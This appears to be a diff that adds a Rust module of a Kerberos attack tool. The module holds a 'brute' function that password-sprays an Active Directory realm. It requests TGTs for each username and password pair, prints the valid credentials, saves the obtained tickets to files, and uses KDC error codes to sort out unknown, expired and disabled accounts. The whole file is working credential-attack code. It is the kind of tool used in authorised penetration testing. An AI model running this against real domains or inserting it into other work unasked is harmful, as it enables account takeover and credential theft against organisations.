@@ -1,0 +1,86 @@
+use crate::ask::request_tgt;
+use crate::cred_format::CredentialFormat;
+use crate::error::{Error, Result};
+use crate::file::save_cred_in_file;
+use crate::krb_user::KerberosUser;
+use crate::transporter::KerberosTransporter;
+use kerberos_constants::error_codes;
+use kerberos_crypto::Key;
+use log::{error, info, warn};
+
+pub fn brute(
+    realm: &str,
+    usernames: Vec<String>,
+    passwords: Vec<String>,
+    transporter: &dyn KerberosTransporter,
+    cred_format: Option<CredentialFormat>,
+) -> Result<()> {
+    let mut non_test_users = Vec::new();
+
+    for password in passwords.iter() {
+        for username in usernames.iter() {
+            if non_test_users.contains(&username) {
+                continue;
+            }
+
+            let user = KerberosUser::new(username.clone(), realm.to_string());
+            let user_key = Key::Secret(password.clone());
+
+            let result = request_tgt(&user, &user_key, true, &*transporter);
+
+            match result {
+                Ok(krb_cred) => {
+                    println!("{}:{}", username, password);
+
+                    if let Some(cred_format) = cred_format {
+                        let filename = format!("{}.{}", username, cred_format);
+                        match save_cred_in_file(
+                            &filename,
+                            krb_cred,
+                            cred_format,
+                        ) {
+                            Ok(_) => info!(
+                                "Save TGT for {} in {}",
+                                username, filename
+                            ),
+                            Err(err) => {
+                                warn!(
+                                    "Error saving TGT for {} in {}: {}",
+                                    username, filename, err
+                                );
+                            }
+                        }
+                    }
+                }
+                Err(err) => match &err {
+                    Error::KrbError(krb_error) => match krb_error.error_code {
+                        error_codes::KDC_ERR_C_PRINCIPAL_UNKNOWN => {
+                            info!("Invalid user {}", username);
+                            non_test_users.push(username);
+                        }
+                        error_codes::KDC_ERR_PREAUTH_FAILED => {
+                            info!("Invalid creds {}:{}", username, password);
+                        }
+                        error_codes::KDC_ERR_KEY_EXPIRED => {
+                            println!("{}:{} Expired", username, password);
+                            non_test_users.push(username);
+                        }
+                        error_codes::KDC_ERR_CLIENT_REVOKED => {
+                            error!("Blocked/Disabled {}", username);
+                            non_test_users.push(username);
+                        }
+                        _ => {
+                            warn!("{}", err);
+                        }
+                    },
+
+                    _ => {
+                        warn!("{}", err);
+                    }
+                },
+            }
+        }
+    }
+
+    return Ok(());
+}
